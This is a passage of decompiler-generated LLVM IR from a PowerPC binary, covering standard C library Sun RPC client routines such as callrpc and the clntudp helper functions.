  call void @__pseudo_cond_branch(i1 %v4_100111c8, i32 %v0_100111b8)
  %v0_100111bc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100111c8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100111bc

dec_label_pc_100111bc:                            ; preds = %dec_label_pc_100111e0, %dec_label_pc_100111b8
  %v1_100111c8 = phi i32 [ %v1_100111c89, %dec_label_pc_100111e0 ], [ %v1_100111c8.pre, %dec_label_pc_100111b8 ]
  %v0_100111bc = phi i32 [ %tmp, %dec_label_pc_100111e0 ], [ %v0_100111bc.pre, %dec_label_pc_100111b8 ]
  %v1_100111bc = inttoptr i32 %v0_100111bc to i8*
  %v2_100111bc = load i8, i8* %v1_100111bc, align 1
  %v1_100111c0 = add i32 %v0_100111bc, 1
  store i32 %v1_100111c0, i32* %r9.global-to-local, align 4
  %v3_100111c4 = icmp eq i8 %v2_100111bc, 0
  br i1 %v3_100111c4, label %dec_label_pc_100111d0, label %dec_label_pc_100111b8

dec_label_pc_100111d0:                            ; preds = %dec_label_pc_100111bc
  %v0_100111d0 = load i32, i32* @r3, align 4
  %v1_100111d0 = add i32 %v0_100111d0, 1
  store i32 %v1_100111d0, i32* @r3, align 4
  %v1_100111d4 = inttoptr i32 %v1_100111d0 to i8*
  %v2_100111d4 = load i8, i8* %v1_100111d4, align 1
  %v3_100111d4 = zext i8 %v2_100111d4 to i32
  store i32 %v3_100111d4, i32* %r11.global-to-local, align 4
  %v3_100111d8 = icmp eq i8 %v2_100111d4, 0
  br i1 %v3_100111d8, label %dec_label_pc_100111e8, label %dec_label_pc_100111e0

dec_label_pc_100111e0:                            ; preds = %entry, %dec_label_pc_100111d0
  %v1_100111c89 = phi i32 [ %v3_100111d4, %dec_label_pc_100111d0 ], [ %v3_100111d44, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100111bc

dec_label_pc_100111e8:                            ; preds = %dec_label_pc_100111d0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100111bc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100111e0, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 268505604, i32* @lr, align 4
  %v0_10011200 = call i32 @__rpc_thread_variables()
  %v1_10011204 = add i32 %v0_10011200, 164
  %v2_10011204 = inttoptr i32 %v1_10011204 to i32*
  %v3_10011204 = load i32, i32* %v2_10011204, align 4
  store i32 %v3_10011204, i32* %r31.global-to-local, align 4
  %v3_10011208 = icmp eq i32 %v3_10011204, 0
  br i1 %v3_10011208, label %dec_label_pc_10011238, label %dec_label_pc_10011210

dec_label_pc_10011210:                            ; preds = %entry
  %v1_10011210 = inttoptr i32 %v3_10011204 to i32*
  %v2_10011210 = load i32, i32* %v1_10011210, align 4
  %v3_10011214 = icmp eq i32 %v2_10011210, 0
  br i1 %v3_10011214, label %dec_label_pc_10011230, label %dec_label_pc_10011220

dec_label_pc_10011220:                            ; preds = %dec_label_pc_10011210
  %v1_10011220 = add i32 %v2_10011210, 4
  %v2_10011220 = inttoptr i32 %v1_10011220 to i32*
  %v3_10011220 = load i32, i32* %v2_10011220, align 4
  %v1_10011224 = add i32 %v3_10011220, 16
  %v2_10011224 = inttoptr i32 %v1_10011224 to i32*
  %v3_10011224 = load i32, i32* %v2_10011224, align 4
  call void @__pseudo_call(i32 %v3_10011224)
  %v0_10011230.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011230

dec_label_pc_10011230:                            ; preds = %dec_label_pc_10011210, %dec_label_pc_10011220
  %v0_10011230 = phi i32 [ %v3_10011204, %dec_label_pc_10011210 ], [ %v0_10011230.pre, %dec_label_pc_10011220 ]
  store i32 %v0_10011230, i32* @r3, align 4
  store i32 268505656, i32* @lr, align 4
  %v0_10011234 = call i32 @free()
  br label %dec_label_pc_10011238

dec_label_pc_10011238:                            ; preds = %entry, %dec_label_pc_10011230
  %v0_10011248 = phi i32 [ %v0_10011200, %entry ], [ %v0_10011234, %dec_label_pc_10011230 ]
  ret i32 %v0_10011248

; uselistorder directives
  uselistorder label %dec_label_pc_10011238, { 1, 0 }
  uselistorder label %dec_label_pc_10011230, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1145 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001124c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1001124c, i32* %stack_var_-128, align 4
  %v0_10011250 = load i32, i32* @lr, align 4
  store i32 %v0_10011250, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r21, align 4
  store i32 %arg2, i32* %r23.global-to-local, align 4
  store i32 %arg3, i32* @r22, align 4
  store i32 %arg4, i32* @r20, align 4
  store i32 %arg5, i32* @r19, align 4
  store i32 %arg6, i32* @r18, align 4
  store i32 %arg7, i32* @r17, align 4
  %v0_1001127c = load i32, i32* @r10, align 4
  store i32 %v0_1001127c, i32* @r16, align 4
  store i32 268505732, i32* @lr, align 4
  %v0_10011280 = call i32 @__rpc_thread_variables()
  store i32 %v0_10011280, i32* %r3.global-to-local, align 4
  %v1_10011284 = add i32 %v0_10011280, 164
  %v2_10011284 = inttoptr i32 %v1_10011284 to i32*
  %v3_10011284 = load i32, i32* %v2_10011284, align 4
  store i32 %v3_10011284, i32* @r30, align 4
  store i32 %v0_10011280, i32* @r29, align 4
  %v3_1001128c = icmp eq i32 %v3_10011284, 0
  br i1 %v3_1001128c, label %dec_label_pc_10011294, label %dec_label_pc_100112b0

dec_label_pc_10011294:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268505760, i32* @lr, align 4
  %v2_1001129c = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1001129c, i32* @r30, align 4
  %v3_100112a0 = icmp eq i32 %v2_1001129c, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100112a0, label %dec_label_pc_100114a8, label %dec_label_pc_100112ac

dec_label_pc_100112ac:                            ; preds = %dec_label_pc_10011294
  %v1_100112ac = load i32, i32* @r29, align 4
  %v2_100112ac = add i32 %v1_100112ac, 164
  %v3_100112ac = inttoptr i32 %v2_100112ac to i32*
  store i32 %v2_1001129c, i32* %v3_100112ac, align 4
  %v0_100112b0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100112b0

dec_label_pc_100112b0:                            ; preds = %entry, %dec_label_pc_100112ac
  %v0_100112b0 = phi i32 [ %v3_10011284, %entry ], [ %v0_100112b0.pre, %dec_label_pc_100112ac ]
  %v1_100112b0 = add i32 %v0_100112b0, 20
  %v2_100112b0 = inttoptr i32 %v1_100112b0 to i32*
  %v3_100112b0 = load i32, i32* %v2_100112b0, align 4
  store i32 %v3_100112b0, i32* @r29, align 4
  %v3_100112b4 = icmp eq i32 %v3_100112b0, 0
  br i1 %v3_100112b4, label %dec_label_pc_100112bc, label %dec_label_pc_100112d4

dec_label_pc_100112bc:                            ; preds = %dec_label_pc_100112b0
  store i32 256, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100112c4.485 to i32), i32* @lr, align 4
  %v0_100112c0 = call i32 @malloc()
  %v1_100112c0 = inttoptr i32 %v0_100112c0 to i8*
  store i32 %v0_100112c0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_100112c8 = load i32, i32* @r30, align 4
  %v3_100112c8 = add i32 %v2_100112c8, 20
  %v4_100112c8 = inttoptr i32 %v3_100112c8 to i32*
  store i32 %v0_100112c0, i32* %v4_100112c8, align 4
  %v0_100112cc = load i32, i32* @r29, align 4
  %v1_100112cc = trunc i32 %v0_100112cc to i8
  store i8 %v1_100112cc, i8* %v1_100112c0, align 1
  %v0_100112d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100112d0 = load i32, i32* @r30, align 4
  %v2_100112d0 = add i32 %v1_100112d0, 4
  %v3_100112d0 = inttoptr i32 %v2_100112d0 to i32*
  store i32 %v0_100112d0, i32* %v3_100112d0, align 4
  %v0_100112d4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100112d4

dec_label_pc_100112d4:                            ; preds = %dec_label_pc_100112b0, %dec_label_pc_100112bc
  %v0_100112f8 = phi i32 [ %v0_100112b0, %dec_label_pc_100112b0 ], [ %v0_100112d4.pre, %dec_label_pc_100112bc ]
  %v1_100112d4 = add i32 %v0_100112f8, 16
  %v2_100112d4 = inttoptr i32 %v1_100112d4 to i32*
  %v3_100112d4 = load i32, i32* %v2_100112d4, align 4
  store i32 %v3_100112d4, i32* %r0.global-to-local, align 4
  %v3_100112d8 = icmp eq i32 %v3_100112d4, 0
  br i1 %v3_100112d8, label %dec_label_pc_1001130c, label %dec_label_pc_100112e0

dec_label_pc_100112e0:                            ; preds = %dec_label_pc_100112d4
  %v1_100112e0 = add i32 %v0_100112f8, 8
  %v2_100112e0 = inttoptr i32 %v1_100112e0 to i32*
  %v3_100112e0 = load i32, i32* %v2_100112e0, align 4
  store i32 %v3_100112e0, i32* %r0.global-to-local, align 4
  %v1_100112e4 = load i32, i32* %r23.global-to-local, align 4
  %v4_100112e4 = icmp eq i32 %v3_100112e0, %v1_100112e4
  br i1 %v4_100112e4, label %dec_label_pc_100112ec, label %dec_label_pc_1001130c

dec_label_pc_100112ec:                            ; preds = %dec_label_pc_100112e0
  %v1_100112ec = add i32 %v0_100112f8, 12
  %v2_100112ec = inttoptr i32 %v1_100112ec to i32*
  %v3_100112ec = load i32, i32* %v2_100112ec, align 4
  store i32 %v3_100112ec, i32* %r0.global-to-local, align 4
  %v1_100112f0 = load i32, i32* @r22, align 4
  %v4_100112f0 = icmp eq i32 %v3_100112ec, %v1_100112f0
  br i1 %v4_100112f0, label %dec_label_pc_100112f8, label %dec_label_pc_1001130c

dec_label_pc_100112f8:                            ; preds = %dec_label_pc_100112ec
  %v1_100112f8 = add i32 %v0_100112f8, 20
  %v2_100112f8 = inttoptr i32 %v1_100112f8 to i32*
  %v3_100112f8 = load i32, i32* %v2_100112f8, align 4
  store i32 %v3_100112f8, i32* %r3.global-to-local, align 4
  %v0_100112fc = load i32, i32* @r21, align 4
  store i32 %v0_100112fc, i32* @r4, align 4
  %v2_10011300 = inttoptr i32 %v3_100112f8 to i8*
  %v3_10011300 = call i32 @__GI_strcoll(i8* %v2_10011300, i32 %v0_100112fc)
  store i32 %v3_10011300, i32* %r3.global-to-local, align 4
  %v3_10011304 = icmp eq i32 %v3_10011300, 0
  br i1 %v3_10011304, label %dec_label_pc_100112f8.dec_label_pc_10011450_crit_edge, label %dec_label_pc_100112f8.dec_label_pc_1001130c_crit_edge

dec_label_pc_100112f8.dec_label_pc_10011450_crit_edge: ; preds = %dec_label_pc_100112f8
  br label %dec_label_pc_10011450

dec_label_pc_100112f8.dec_label_pc_1001130c_crit_edge: ; preds = %dec_label_pc_100112f8
  %v0_1001130c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001130c

dec_label_pc_1001130c:                            ; preds = %dec_label_pc_100112f8.dec_label_pc_1001130c_crit_edge, %dec_label_pc_100112ec, %dec_label_pc_100112e0, %dec_label_pc_100112d4
  %v0_1001130c = phi i32 [ %v0_1001130c.pre, %dec_label_pc_100112f8.dec_label_pc_1001130c_crit_edge ], [ %v0_100112f8, %dec_label_pc_100112ec ], [ %v0_100112f8, %dec_label_pc_100112e0 ], [ %v0_100112f8, %dec_label_pc_100112d4 ]
  %v1_1001130c = add i32 %v0_1001130c, 4
  %v2_1001130c = inttoptr i32 %v1_1001130c to i32*
  %v3_1001130c = load i32, i32* %v2_1001130c, align 4
  store i32 %v3_1001130c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10011314 = add i32 %v0_1001130c, 16
  %v3_10011314 = inttoptr i32 %v2_10011314 to i32*
  store i32 0, i32* %v3_10011314, align 4
  %v3_10011318 = icmp eq i32 %v3_1001130c, -1
  br i1 %v3_10011318, label %dec_label_pc_1001132c, label %dec_label_pc_10011320

dec_label_pc_10011320:                            ; preds = %dec_label_pc_1001130c
  store i32 ptrtoint (i32* @global_var_10011324.486 to i32), i32* @lr, align 4
  %v1_10011320 = call i32 @__libc_close(i32 %v3_1001130c)
  store i32 %v1_10011320, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10011328 = load i32, i32* @r30, align 4
  %v2_10011328 = add i32 %v1_10011328, 4
  %v3_10011328 = inttoptr i32 %v2_10011328 to i32*
  store i32 -1, i32* %v3_10011328, align 4
  br label %dec_label_pc_1001132c

dec_label_pc_1001132c:                            ; preds = %dec_label_pc_1001130c, %dec_label_pc_10011320
  %v0_1001132c = load i32, i32* @r30, align 4
  %v1_1001132c = inttoptr i32 %v0_1001132c to i32*
  %v2_1001132c = load i32, i32* %v1_1001132c, align 4
  store i32 %v2_1001132c, i32* %r3.global-to-local, align 4
  %v3_10011330 = icmp eq i32 %v2_1001132c, 0
  br i1 %v3_10011330, label %dec_label_pc_1001134c, label %dec_label_pc_10011338

dec_label_pc_10011338:                            ; preds = %dec_label_pc_1001132c
  %v1_10011338 = add i32 %v2_1001132c, 4
  %v2_10011338 = inttoptr i32 %v1_10011338 to i32*
  %v3_10011338 = load i32, i32* %v2_10011338, align 4
  %v1_1001133c = add i32 %v3_10011338, 16
  %v2_1001133c = inttoptr i32 %v1_1001133c to i32*
  %v3_1001133c = load i32, i32* %v2_1001133c, align 4
  call void @__pseudo_call(i32 %v3_1001133c)
  %v0_10011348 = load i32, i32* %r29.global-to-local, align 4
  %v1_10011348 = load i32, i32* @r30, align 4
  %v2_10011348 = inttoptr i32 %v1_10011348 to i32*
  store i32 %v0_10011348, i32* %v2_10011348, align 4
  br label %dec_label_pc_1001134c

dec_label_pc_1001134c:                            ; preds = %dec_label_pc_1001132c, %dec_label_pc_10011338
  %v2_1001134c = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1001134c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r29, align 4
  store i32 %v2_1001134c, i32* %stack_var_-1168, align 4
  %v2_1001138c = ptrtoint i32* %stack_var_-1145 to i32
  %v2_1001139c = ptrtoint i32* %stack_var_-120 to i32
  %v2_100113a0 = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_1001138c

dec_label_pc_1001135c:                            ; preds = %dec_label_pc_1001138c, %dec_label_pc_100113b8
  %v3_1001135c = load i32, i32* %stack_var_-116, align 4
  store i32 %v3_1001135c, i32* %r0.global-to-local, align 4
  %v3_10011360 = icmp eq i32 %v3_1001135c, -1
  br i1 %v3_10011360, label %dec_label_pc_10011368, label %dec_label_pc_100114a4

dec_label_pc_10011368:                            ; preds = %dec_label_pc_1001135c
  %v0_10011368 = call i32 @__errno_location()
  store i32 %v0_10011368, i32* %r3.global-to-local, align 4
  %v0_1001136c = load i32, i32* @r29, align 4
  %v1_1001136c = add i32 %v0_1001136c, 30
  store i32 %v1_1001136c, i32* %r0.global-to-local, align 4
  %v1_10011370 = inttoptr i32 %v0_10011368 to i32*
  %v2_10011370 = load i32, i32* %v1_10011370, align 4
  %v1_10011374 = call i32 @__asm_rlwinm(i32 %v1_1001136c, i32 0, i32 0, i32 27)
  store i32 %v1_10011374, i32* %r0.global-to-local, align 4
  %v3_1001137c = icmp eq i32 %v2_10011370, 34
  br i1 %v3_1001137c, label %dec_label_pc_10011384, label %dec_label_pc_100114a4

dec_label_pc_10011384:                            ; preds = %dec_label_pc_10011368
  %v2_10011384 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v2_10011384, i32* %r0.global-to-local, align 4
  %v1_10011388 = load i32, i32* @r1, align 4
  %v3_10011388 = sub i32 %v1_10011388, %v1_10011374
  %v4_10011388 = inttoptr i32 %v3_10011388 to i32*
  store i32 %v2_10011384, i32* %v4_10011388, align 4
  br label %dec_label_pc_1001138c

dec_label_pc_1001138c:                            ; preds = %dec_label_pc_1001134c, %dec_label_pc_10011384
  store i32 %v2_1001138c, i32* %r0.global-to-local, align 4
  %v1_10011394 = call i32 @__asm_rlwinm(i32 %v2_1001138c, i32 0, i32 0, i32 27)
  %v0_100113a4 = load i32, i32* @r21, align 4
  store i32 %v0_100113a4, i32* %r3.global-to-local, align 4
  %v0_100113a8 = load i32, i32* @r29, align 4
  %v1_100113a8 = mul i32 %v0_100113a8, 2
  store i32 %v1_100113a8, i32* %r29.global-to-local, align 4
  store i32 268506032, i32* @lr, align 4
  %v7_100113ac = call i32 @gethostbyname_r(i32 %v0_100113a4, i32* nonnull %stack_var_-96, i32 %v1_10011394, i32 %v2_1001139c, i32 %v2_100113a0, i32 %v2_100113a0)
  store i32 %v7_100113ac, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v7_100113ac, 65536
  %sext.off = or i32 %sext, 65535
  %tmp = icmp ult i32 %sext.off, 131071
  br i1 %tmp, label %dec_label_pc_100113b8, label %dec_label_pc_1001135c

dec_label_pc_100113b8:                            ; preds = %dec_label_pc_1001138c
  %v3_100113b8 = load i32, i32* %stack_var_-120, align 4
  %v3_100113bc = icmp eq i32 %v3_100113b8, 0
  br i1 %v3_100113bc, label %dec_label_pc_1001135c, label %dec_label_pc_100113c4

dec_label_pc_100113c4:                            ; preds = %dec_label_pc_100113b8
  %v1_100113c4 = add i32 %v3_100113b8, 16
  %v2_100113c4 = inttoptr i32 %v1_100113c4 to i32*
  %v3_100113c4 = load i32, i32* %v2_100113c4, align 4
  %v2_100113c8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_100113c8, i32* @r3, align 4
  %v1_100113cc = add i32 %v3_100113b8, 12
  %v2_100113cc = inttoptr i32 %v1_100113cc to i32*
  %v3_100113cc = load i32, i32* %v2_100113cc, align 4
  store i32 %v3_100113cc, i32* @r5, align 4
  %v1_100113d4 = inttoptr i32 %v3_100113c4 to i32*
  %v2_100113d4 = load i32, i32* %v1_100113d4, align 4
  store i32 %v2_100113d4, i32* @r4, align 4
  store i32 5, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100113e0.487 to i32), i32* @lr, align 4
  %v0_100113dc = call i32 @memcpy()
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_100113e4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_100113e4, i32* %r3.global-to-local, align 4
  %v0_100113e8 = load i32, i32* @r23, align 4
  %v0_100113ec = load i32, i32* @r22, align 4
  %v2_100113f0 = ptrtoint i32* %stack_var_-72 to i32
  %v0_100113f4 = load i32, i32* @r30, align 4
  %v1_100113f4 = add i32 %v0_100113f4, 4
  store i32 %v1_100113f4, i32* @r7, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v0_10011400 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10011400, i32* %stack_var_-72, align 4
  store i32 268506124, i32* @lr, align 4
  %v6_10011408 = call i32 @__GI_clntudp_create(i32* nonnull %stack_var_-112, i32 %v0_100113e8, i32 %v0_100113ec, i32 %v2_100113f0, i32 %v1_100113f4)
  store i32 %v6_10011408, i32* %r3.global-to-local, align 4
  %v3_1001140c = icmp eq i32 %v6_10011408, 0
  %v1_10011410 = load i32, i32* @r30, align 4
  %v2_10011410 = inttoptr i32 %v1_10011410 to i32*
  store i32 %v6_10011408, i32* %v2_10011410, align 4
  br i1 %v3_1001140c, label %dec_label_pc_10011418, label %dec_label_pc_10011424

dec_label_pc_10011418:                            ; preds = %dec_label_pc_100113c4
  store i32 268506140, i32* @lr, align 4
  %v0_10011418 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_10011418, i32* %r3.global-to-local, align 4
  %v1_1001141c = inttoptr i32 %v0_10011418 to i32*
  %v2_1001141c = load i32, i32* %v1_1001141c, align 4
  store i32 %v2_1001141c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100114a8

dec_label_pc_10011424:                            ; preds = %dec_label_pc_100113c4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011428 = load i32, i32* @r23, align 4
  %v1_10011428 = load i32, i32* @r30, align 4
  %v2_10011428 = add i32 %v1_10011428, 8
  %v3_10011428 = inttoptr i32 %v2_10011428 to i32*
  store i32 %v0_10011428, i32* %v3_10011428, align 4
  %v0_1001142c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001142c = load i32, i32* @r30, align 4
  %v2_1001142c = add i32 %v1_1001142c, 16
  %v3_1001142c = inttoptr i32 %v2_1001142c to i32*
  store i32 %v0_1001142c, i32* %v3_1001142c, align 4
  %v0_10011430 = load i32, i32* @r21, align 4
  store i32 %v0_10011430, i32* @r4, align 4
  %v0_10011434 = load i32, i32* @r22, align 4
  %v1_10011434 = load i32, i32* @r30, align 4
  %v2_10011434 = add i32 %v1_10011434, 12
  %v3_10011434 = inttoptr i32 %v2_10011434 to i32*
  store i32 %v0_10011434, i32* %v3_10011434, align 4
  %v0_1001143c = load i32, i32* @r30, align 4
  %v1_1001143c = add i32 %v0_1001143c, 20
  %v2_1001143c = inttoptr i32 %v1_1001143c to i32*
  %v3_1001143c = load i32, i32* %v2_1001143c, align 4
  store i32 %v3_1001143c, i32* %r3.global-to-local, align 4
  store i32 268506180, i32* @lr, align 4
  %v3_10011440 = call i32 @strncpy(i32 %v3_1001143c, i32 %v0_10011430, i32 255)
  store i32 %v3_10011440, i32* %r3.global-to-local, align 4
  %v0_10011444 = load i32, i32* @r30, align 4
  %v1_10011444 = add i32 %v0_10011444, 20
  %v2_10011444 = inttoptr i32 %v1_10011444 to i32*
  %v3_10011444 = load i32, i32* %v2_10011444, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1001144c = add i32 %v3_10011444, 255
  %v4_1001144c = inttoptr i32 %v3_1001144c to i8*
  store i8 0, i8* %v4_1001144c, align 1
  br label %dec_label_pc_10011450

dec_label_pc_10011450:                            ; preds = %dec_label_pc_100112f8.dec_label_pc_10011450_crit_edge, %dec_label_pc_10011424
  %v0_10011458 = load i32, i32* @r30, align 4
  %v1_10011458 = inttoptr i32 %v0_10011458 to i32*
  %v2_10011458 = load i32, i32* %v1_10011458, align 4
  store i32 25, i32* %stack_var_-72, align 4
  store i32 %v2_10011458, i32* %r3.global-to-local, align 4
  %v1_10011478 = add i32 %v2_10011458, 4
  %v2_10011478 = inttoptr i32 %v1_10011478 to i32*
  %v3_10011478 = load i32, i32* %v2_10011478, align 4
  %v1_10011480 = inttoptr i32 %v3_10011478 to i32*
  %v2_10011480 = load i32, i32* %v1_10011480, align 4
  call void @__pseudo_call(i32 %v2_10011480)
  %v0_10011490 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011490 = icmp eq i32 %v0_10011490, 0
  br i1 %v3_10011490, label %dec_label_pc_100114a8, label %dec_label_pc_10011498

dec_label_pc_10011498:                            ; preds = %dec_label_pc_10011450
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001149c = load i32, i32* @r30, align 4
  %v2_1001149c = add i32 %v1_1001149c, 16
  %v3_1001149c = inttoptr i32 %v2_1001149c to i32*
  store i32 0, i32* %v3_1001149c, align 4
  %v0_100114bc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100114a8

dec_label_pc_100114a4:                            ; preds = %dec_label_pc_10011368, %dec_label_pc_1001135c
  store i32 13, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100114a8

dec_label_pc_100114a8:                            ; preds = %dec_label_pc_10011450, %dec_label_pc_10011294, %dec_label_pc_10011498, %dec_label_pc_10011418, %dec_label_pc_100114a4
  %v0_100114bc = phi i32 [ 0, %dec_label_pc_10011450 ], [ 0, %dec_label_pc_10011294 ], [ %v0_100114bc.pre, %dec_label_pc_10011498 ], [ %v2_1001141c, %dec_label_pc_10011418 ], [ 13, %dec_label_pc_100114a4 ]
  %v2_100114a8 = load i32, i32* %stack_var_-128, align 4
  %v1_100114ac = add i32 %v2_100114a8, 4
  %v2_100114ac = inttoptr i32 %v1_100114ac to i32*
  %v3_100114ac = load i32, i32* %v2_100114ac, align 4
  store i32 %v3_100114ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_100114bc

; uselistorder directives
  uselistorder i32 %v2_10011458, { 1, 0 }
  uselistorder i32 %v2_100113a0, { 1, 0 }
  uselistorder i32 %v3_1001130c, { 1, 0, 2 }
  uselistorder i32 %v0_1001130c, { 1, 0 }
  uselistorder i32 %v0_100112c0, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 13, { 0, 3, 2, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_100114a8, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10011450, { 1, 0 }
  uselistorder label %dec_label_pc_1001138c, { 1, 0 }
  uselistorder label %dec_label_pc_1001135c, { 1, 0 }
  uselistorder label %dec_label_pc_1001134c, { 1, 0 }
  uselistorder label %dec_label_pc_1001132c, { 1, 0 }
  uselistorder label %dec_label_pc_100112d4, { 1, 0 }
  uselistorder label %dec_label_pc_100112b0, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_100114ec = add i32 %arg1, 8
  %v2_100114ec = inttoptr i32 %v1_100114ec to i32*
  %v3_100114ec = load i32, i32* %v2_100114ec, align 4
  store i32 %v3_100114ec, i32* %r3.global-to-local, align 4
  %v2_100114f0 = add i32 %v3_100114ec, 56
  %v3_100114f0 = inttoptr i32 %v2_100114f0 to i32*
  store i32 2, i32* %v3_100114f0, align 4
  %v0_100114f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100114f4 = add i32 %v0_100114f4, 56
  store i32 %v1_100114f4, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %arg2)
  ret i32 %v1_100114f4

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_10011510 = load i32, i32* @r3, align 4
  ret i32 %v0_10011510
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10011514 = add i32 %arg2, -1
  %v2_1001151c = icmp ugt i32 %v1_10011514, 14
  br i1 %v2_1001151c, label %dec_label_pc_10011544, label %dec_label_pc_10011528

dec_label_pc_10011528:                            ; preds = %entry
  %v1_1001152c = mul i32 %v1_10011514, 4
  %v2_10011534 = add i32 %v1_1001152c, ptrtoint (i32* @global_var_10019f68.488 to i32)
  %v3_10011534 = inttoptr i32 %v2_10011534 to i32*
  %v4_10011534 = load i32, i32* %v3_10011534, align 4
  %v2_10011538 = add i32 %v4_10011534, ptrtoint (i32* @global_var_10019f68.488 to i32)
  call void @__pseudo_branch(i32 %v2_10011538)
  br label %dec_label_pc_10011544

dec_label_pc_10011544:                            ; preds = %entry, %dec_label_pc_10011528
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10011544, { 1, 0 }
}

define i32 @function_1001154c() local_unnamed_addr {
dec_label_pc_1001154c:
  %v1_10011560 = load i32, i32* @r10, align 4
  %v2_10011560 = add i32 %v1_10011560, 4
  %v3_10011560 = inttoptr i32 %v2_10011560 to i32*
  store i32 1, i32* %v3_10011560, align 4
  ret i32 1
}

define i32 @function_10011568(i32* %arg1) local_unnamed_addr {
dec_label_pc_10011568:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10011568 = add i32 %tmp, 4
  %v2_10011568 = inttoptr i32 %v1_10011568 to i32*
  %v3_10011568 = load i32, i32* %v2_10011568, align 4
  %v2_10011570 = load i32, i32* %arg1, align 4
  store i32 %v2_10011570, i32* %r0.global-to-local, align 4
  %v1_10011574 = load i32, i32* @r10, align 4
  %v2_10011574 = add i32 %v1_10011574, 40
  %v3_10011574 = inttoptr i32 %v2_10011574 to i32*
  store i32 %v3_10011568, i32* %v3_10011574, align 4
  %v0_10011578 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011578 = load i32, i32* @r10, align 4
  %v2_10011578 = add i32 %v1_10011578, 36
  %v3_10011578 = inttoptr i32 %v2_10011578 to i32*
  store i32 %v0_10011578, i32* %v3_10011578, align 4
  ret i32 1
}

define i32 @function_10011580(i32 %arg1) local_unnamed_addr {
dec_label_pc_10011580:
  %r9.global-to-local = alloca i32, align 4
